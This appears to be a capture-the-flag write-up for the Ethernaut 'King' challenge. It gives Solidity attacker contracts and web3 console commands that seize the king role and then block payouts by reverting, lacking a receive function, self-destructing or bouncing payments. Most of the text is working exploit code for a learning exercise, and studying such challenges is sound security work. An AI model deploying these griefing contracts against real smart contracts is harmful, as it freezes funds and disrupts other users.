The aim is to grief this contract:

```solidity
receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
}
```

Only the third line can fail.
A malicious contract can be crafted in several ways to achieve this:

0) not processing payments
1) refusing payments
2) destroying the contract
3) returning the payment

But first the contract has to become king.

## Becoming the king

```solidity
function pwn(address target) public payable {
    payable(target).transfer(msg.value);
}
```

```js
// deploy the malicious contract before this
abi = '[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"address","name":"target","type":"address"}],"name":"pwn","outputs":[],"stateMutability":"payable","type":"function"}]';
kong = new web3.eth.Contract(JSON.parse(abi), '0x8f985a6Ac1B47433a53f71Bc7F1dC1008E73c058');
// 1000000000000000
(await contract.prize()).toNumber()
// '0x3049C00639E6dfC269ED1451764a046f7aE500c6', the level
await contract._king()
// become the king
kong.methods.pwn(contract.address).send({from: player, value: 1000000000000000, gas: 900000}, function(error, data) {console.log(data);});
// '0x8f985a6Ac1B47433a53f71Bc7F1dC1008E73c058', the malicious contract
await contract._king()
```

## Not processing payments

This solution actually requires no code!
Since the contract has neither fallback nor `receive` functions, it cannot process payments and will throw.

## Refusing payments

Now the contract processes payments but fails explicitely:

```solidity
function () external payable {
    revert("fail");
}
```

## Deleting the king contract

Another way is to remove the malicious contract so that it cannot be called:

```solidity
function pwn() public {
    selfdestruct(payable(0x0));
}
```

But you can still send money to the address, even though the contract has been removed!
It fails to fail.

## Returning the payment

The reentrancy vulnerability actually fails because of the gas limit on the first `transfer` in the original contract.

Still it would have been implemented by bouncing back the payment when receiving it:

```solidity
function () external payable {
    payable(TARGET).call{value:msg.value}("");
}
```
